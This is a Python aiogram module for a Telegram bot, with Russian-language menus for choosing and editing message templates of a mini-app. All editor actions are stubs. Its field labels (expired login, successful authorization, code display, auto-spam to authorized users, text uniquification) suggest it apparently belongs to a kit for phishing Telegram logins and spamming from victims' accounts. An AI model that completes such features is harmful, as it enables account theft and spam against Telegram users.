"""
========================================================================
 МОДУЛЬ: «📋 Изменить шаблон» → меню шаблонов → редактор шаблона
------------------------------------------------------------------------
 Меню шаблонов:
   📋 Меню шаблонов:
   [ Стандартный шаблон ]             ← открывает редактор шаблона
   [⚙️ Создать шаблон] [➕ Стандартный шаблон]
   [💎 Шаблоны мини-апп]
   [📥 Добавить по коду] [⬅️ Назад]

 Редактор стандартного шаблона (по макету) — набор настраиваемых полей:
 тексты сообщений, кнопки, страницы мини-аппа, уникализация текста и т.д.
 Пункты пока заглушки («в разработке») — наполняем по очереди.
========================================================================
"""

from aiogram import F, Router
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder

from database import get_bot, update_bot_field
from handlers.cards import owns
from templates import template_name

router = Router()


# ----------------------------------------------------------- меню шаблонов
def _menu_text(bot: dict) -> str:
    return "📋 <b>Меню шаблонов:</b>"


def _menu_kb(bot: dict) -> InlineKeyboardMarkup:
    bid = bot["id"]
    b = InlineKeyboardBuilder()
    # текущий шаблон (на всю ширину) — открывает редактор
    b.row(
        InlineKeyboardButton(
            text=template_name(bot.get("template")),
            callback_data=f"std_open:{bid}",
        )
    )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Создать шаблон", callback_data=f"tpl_soon:{bid}:create"
        ),
        InlineKeyboardButton(
            text="➕ Стандартный шаблон", callback_data=f"tpl_soon:{bid}:addstd"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="💎 Шаблоны мини-апп", callback_data=f"tpl_soon:{bid}:miniapp"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="📥 Добавить по коду", callback_data=f"tpl_soon:{bid}:code"
        ),
        InlineKeyboardButton(text="⬅️ Назад", callback_data=f"bot:{bid}"),
    )
    return b.as_markup()


# ------------------------------------------- редактор стандартного шаблона
# (подпись, callback-действие) — поля редактора по макету
_STD_ROWS: list[tuple[str, str]] = [
    ("Ответ на /start", "start_msg"),
    ("Кнопка запуска мини-апп", "start_btn"),
    ("Второе сообщение после /start", "second_msg"),
    ("Просроченный вход", "expired_msg"),
    ("Кнопка просрочки", "expired_btn"),
    ("Успешная авторизация", "auth_ok"),
    ("Автоспам авторизованные", "spam_auth"),
    ("Автоспам неавторизованные", "spam_unauth"),
    ("Пост админ канала", "admin_post"),
    ("Показ успешной авторизации", "show_auth"),
    ("📋 Показ кода", "show_code"),
    ("📱 Страницы мини-апп", "pages"),
]


def _std_text(bot: dict) -> str:
    return "💎 <b>Шаблон мини-апп «Стандартный шаблон»:</b>"


def _std_kb(bot: dict) -> InlineKeyboardMarkup:
    bid = bot["id"]
    b = InlineKeyboardBuilder()
    for label, act in _STD_ROWS:
        b.row(InlineKeyboardButton(text=label, callback_data=f"std_act:{bid}:{act}"))
    b.row(
        InlineKeyboardButton(
            text="⚡ Уникализация текста", callback_data=f"std_act:{bid}:uniq"
        ),
        InlineKeyboardButton(
            text="📋 Создать копию", callback_data=f"std_act:{bid}:copy"
        ),
    )
    b.row(
        InlineKeyboardButton(
            text="⚙️ Код шаблона", callback_data=f"std_act:{bid}:tcode"
        ),
        InlineKeyboardButton(text="🏷 Название", callback_data=f"std_act:{bid}:name"),
    )
    b.row(
        InlineKeyboardButton(
            text="🎨 Оформление бота", callback_data=f"std_act:{bid}:design"
        )
    )
    b.row(
        InlineKeyboardButton(
            text="🗑 Удалить шаблон", callback_data=f"std_act:{bid}:delete"
        )
    )
    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"template:{bid}"))
    return b.as_markup()


# ----------------------------------------------------------------- хендлеры
@router.callback_query(F.data.startswith("template:"))
async def open_menu(callback: CallbackQuery) -> None:
    bot = get_bot(int(callback.data.split(":")[1]))
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    await callback.message.edit_text(_menu_text(bot), reply_markup=_menu_kb(bot))
    await callback.answer()


@router.callback_query(F.data.startswith("std_open:"))
async def open_std(callback: CallbackQuery) -> None:
    bot = get_bot(int(callback.data.split(":")[1]))
    if not owns(callback.from_user.id, bot):
        await callback.answer("Бот не найден.", show_alert=True)
        return
    # выбор стандартного шаблона как активного
    update_bot_field(bot["id"], "template", "standard")
    bot = get_bot(bot["id"])
    await callback.message.edit_text(_std_text(bot), reply_markup=_std_kb(bot))
    await callback.answer()


@router.callback_query(F.data.startswith("std_act:"))
async def std_action(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)


@router.callback_query(F.data.startswith("tpl_soon:"))
async def not_ready(callback: CallbackQuery) -> None:
    await callback.answer("🚧 В разработке", show_alert=True)
